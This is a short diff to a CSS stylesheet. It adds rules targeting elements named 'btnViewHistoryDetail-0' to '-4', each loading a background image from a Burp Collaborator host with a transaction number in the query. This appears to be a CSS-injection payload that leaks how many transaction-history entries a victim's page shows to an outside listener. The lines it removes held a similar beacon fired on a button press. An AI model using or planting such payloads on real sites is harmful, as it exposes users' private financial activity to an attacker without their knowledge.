@@ -1,6 +1,15 @@
-body *, html * {
-    background: lightblue url(img_tree.gif) no-repeat fixed center;
+div#\'btnViewHistoryDetail-\'\ \+\ 0  {
+    background: url("https://vvufkr08jh961ffkx38xlew9d0js7h.burpcollaborator.net?number_transaction=1");
 }
-button.btn-primary-gradient:active {
-    background: url("https://4w1ol01hkqaf2ogtyc96mnxie9kz8o.burpcollaborator.net/victim_press=true");
+div#\'btnViewHistoryDetail-\'\ \+\ 1  {
+    background: url("https://vvufkr08jh961ffkx38xlew9d0js7h.burpcollaborator.net?number_transaction=2");
+}
+div#\'btnViewHistoryDetail-\'\ \+\ 2  {
+    background: url("https://vvufkr08jh961ffkx38xlew9d0js7h.burpcollaborator.net?number_transaction=3");
+}
+div#\'btnViewHistoryDetail-\'\ \+\ 3  {
+    background: url("https://vvufkr08jh961ffkx38xlew9d0js7h.burpcollaborator.net?number_transaction=4");
+}
+div#\'btnViewHistoryDetail-\'\ \+\ 4  {
+    background: url("https://vvufkr08jh961ffkx38xlew9d0js7h.burpcollaborator.net?number_transaction=5");
 }
